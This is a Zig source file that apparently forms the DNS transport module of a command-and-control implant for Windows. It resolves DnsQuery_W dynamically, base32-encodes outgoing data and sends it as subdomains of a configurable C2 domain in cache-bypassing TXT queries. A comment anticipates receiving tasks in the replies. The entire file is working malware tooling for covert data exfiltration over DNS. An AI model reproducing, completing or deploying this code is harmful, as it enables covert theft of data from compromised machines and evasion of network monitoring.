const std = @import("std");
const t = @import("mod.zig");
const build_options = @import("build_options");

// --- DNS Constants ---
const DNS_TYPE_TEXT: u16 = 0x0010;
const DNS_QUERY_STANDARD: u32 = 0x00000000;
const DNS_QUERY_BYPASS_CACHE: u32 = 0x00000008;

// --- DNS Function Type Definitions ---
const DnsQueryWFn = *const fn (
    [*c]const u16,  // lpstrName
    u16,            // wType
    u32,            // fOptions
    ?*anyopaque,    // pExtra
    ?*?*anyopaque,  // ppQueryResults
    ?*anyopaque     // pReserved
) callconv(.winapi) i32;

const DnsRecordListFreeFn = *const fn (?*anyopaque, u32) callconv(.winapi) void;

// --- Win32 Imports ---
extern "kernel32" fn LoadLibraryA([*c]const u8) callconv(.winapi) ?*anyopaque;
extern "kernel32" fn GetProcAddress(?*anyopaque, [*c]const u8) callconv(.winapi) ?*anyopaque;


// --- DNS Record Struct ---
const DNS_RECORD = extern struct {
    pNext: ?*DNS_RECORD,
    pName: [*c]const u16,
    wType: u16,
    wDataLength: u16,
    flags: u32,
    dwTtl: u32,
    dwReserved: u32,
    Data: extern union {
        TXT: extern struct {
            dwStringCount: u32,
            pStringArray: [*c][*c]u16,
        },
    },
};

pub const DnsTransport = struct {
    allocator: std.mem.Allocator,
    
    // Function pointers
    dns_query_w: DnsQueryWFn,
    dns_record_list_free: DnsRecordListFreeFn,

    pub fn init(allocator: std.mem.Allocator) !*DnsTransport {
        const self = try allocator.create(DnsTransport);
        
        const hDnsApi = LoadLibraryA("dnsapi.dll") orelse return error.DnsApiLoadFailed;
        
        self.dns_query_w = @ptrCast(GetProcAddress(hDnsApi, "DnsQuery_W") orelse return error.SymbolNotFound);
        self.dns_record_list_free = @ptrCast(GetProcAddress(hDnsApi, "DnsRecordListFree") orelse return error.SymbolNotFound);
        
        self.allocator = allocator;
        return self;
    }

    pub fn transport(self: *DnsTransport) t.Transport {
        return .{
            .ptr = self,
            .send_fn = send_wrapper,
            .receive_fn = receive_wrapper,
        };
    }

    // Base32 helper
    fn base32Encode(self: *DnsTransport, data: []const u8) ![]u8 {
        const alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        var out: std.ArrayListUnmanaged(u8) = .empty;
        var buffer: u64 = 0;
        var bits: u32 = 0;
        for (data) |b| {
            buffer = (buffer << 8) | b;
            bits += 8;
            while (bits >= 5) {
                bits -= 5;
                try out.append(self.allocator, alphabet[(buffer >> @as(u6, @intCast(bits))) & 0x1F]);
            }
        }
        if (bits > 0) {
            try out.append(self.allocator, alphabet[(buffer << @as(u6, @intCast(5 - bits))) & 0x1F]);
        }
        return out.toOwnedSlice(self.allocator);
    }

    fn send_wrapper(ptr: *anyopaque, path: []const u8, data: []const u8) anyerror!void {
        _ = path;
        const self: *DnsTransport = @ptrCast(@alignCast(ptr));
        
        const b32 = try self.base32Encode(data);
        defer self.allocator.free(b32);

        // Build query: [b32_payload].[domain]
        // Example: deadbeef.c2.example.com
        const query_str = try std.fmt.allocPrint(self.allocator, "{s}.{s}", .{ b32, build_options.c2_domain });
        defer self.allocator.free(query_str);

        const query_w = try std.unicode.utf8ToUtf16LeAllocZ(self.allocator, query_str);
        defer self.allocator.free(query_w);

        var pResults: ?*anyopaque = null;
        _ = self.dns_query_w(query_w.ptr, DNS_TYPE_TEXT, DNS_QUERY_STANDARD | DNS_QUERY_BYPASS_CACHE, null, &pResults, null);
        
        if (pResults) |pr| {
            defer self.dns_record_list_free(pr, 0);
            // In C2, we might receive tasks in the TXT response here
        }
    }

    fn receive_wrapper(ptr: *anyopaque, allocator: std.mem.Allocator) anyerror![]u8 {
        _ = ptr;
        _ = allocator;
        return error.NotImplemented;
    }
};
